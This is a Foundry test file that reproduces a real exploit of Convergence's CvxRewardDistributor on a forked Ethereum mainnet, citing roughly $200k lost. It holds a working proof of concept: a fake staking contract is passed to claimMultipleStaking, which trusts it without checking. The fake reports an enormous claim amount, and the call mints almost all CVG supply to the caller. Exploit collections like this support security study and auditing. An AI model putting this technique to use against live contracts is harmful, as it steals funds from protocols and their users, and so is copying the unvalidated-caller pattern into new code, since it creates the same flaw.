// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo -- Total Lost : ~200k USD
// TX : https://etherscan.io/tx/0x636be30e58acce0629b2bf975b5c3133840cd7d41ffc3b903720c528f01c65d9
// Original Attacker: https://etherscan.io/address/0x03560a9d7a2c391fb1a087c33650037ae30de3aa
// Original Attack Contract : https://etherscan.io/address/0xee45384d4861b6fb422dfa03fbdcc6e29d7beb69
// GUY : https://x.com/DecurityHQ/status/1819030089012527510

interface ICommonStruct {
    struct TokenAmount {
        IERC20 token;
        uint256 amount;
    }
}

interface ICvxStakingPositionService {

    function claimCvgCvxMultiple(address account) external returns (uint256, ICommonStruct.TokenAmount[] memory);

}

interface ICvxRewardDistributor{

    function claimMultipleStaking(
        ICvxStakingPositionService[] calldata claimContracts,
        address _account,
        uint256 _minCvgCvxAmountOut,
        bool _isConvert,
        uint256 cvxRewardCount
    ) external;

}

interface ICurveTwocryptoOptimized{
    function exchange ( uint256 i, uint256 j, uint256 dx, uint256 min_dy, address receiver ) external returns ( uint256 );
}


contract ContractTest is Test {

    ICvxRewardDistributor cvxRewardDistributor = ICvxRewardDistributor(0x2b083beaaC310CC5E190B1d2507038CcB03E7606);
    IERC20 CVG = IERC20(0x97efFB790f2fbB701D88f89DB4521348A2B77be8);
    ICurveTwocryptoOptimized CVGETH = ICurveTwocryptoOptimized(0x004C167d27ADa24305b76D80762997Fa6EB8d9B2);
    ICurveTwocryptoOptimized CVGFRAX = ICurveTwocryptoOptimized(0xa7B0E924c2dBB9B4F576CCE96ac80657E42c3e42);
    


    function setUp() public {
        vm.createSelectFork("mainnet", 20434450 - 1);
    }

    function testExploit() external {
        Mock mock = new Mock();

        ICvxStakingPositionService[] memory claimContracts = new ICvxStakingPositionService[](1);
        claimContracts[0] = ICvxStakingPositionService(address(mock));

        CVG.totalSupply();

        cvxRewardDistributor.claimMultipleStaking(
            claimContracts,
            address(this),
            1,
            true,
            1
        );

        uint256 cvg_bal = CVG.balanceOf(address(this));

        emit log_named_decimal_uint("[End] Attacker CVG balance after exploit", cvg_bal , 18);

    }
    

    receive() external payable {}
}


contract Mock {

    IERC20 CVG = IERC20(0x97efFB790f2fbB701D88f89DB4521348A2B77be8);

    function claimCvgCvxMultiple(address account) external returns (uint256, ICommonStruct.TokenAmount[] memory) {

        ICommonStruct.TokenAmount[] memory tokenAmount = new ICommonStruct.TokenAmount[](0);

        return ( type(uint256).max - CVG.totalSupply(), tokenAmount);

    }

}